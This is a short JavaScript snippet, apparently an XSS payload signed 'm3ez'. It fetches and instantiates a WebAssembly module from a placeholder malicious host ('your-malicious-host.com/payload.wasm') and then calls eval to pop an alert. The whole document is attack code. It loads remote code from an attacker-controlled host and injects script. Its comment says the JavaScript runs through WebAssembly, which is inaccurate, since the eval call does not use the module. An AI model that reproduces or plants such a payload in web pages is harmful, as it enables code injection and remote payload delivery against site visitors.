WebAssembly.instantiateStreaming(fetch("https://your-malicious-host.com/payload.wasm"))
  .then(({ instance }) => {
    eval('alert("XSS by m3ez")'); // Executes JavaScript through WebAssembly
  });
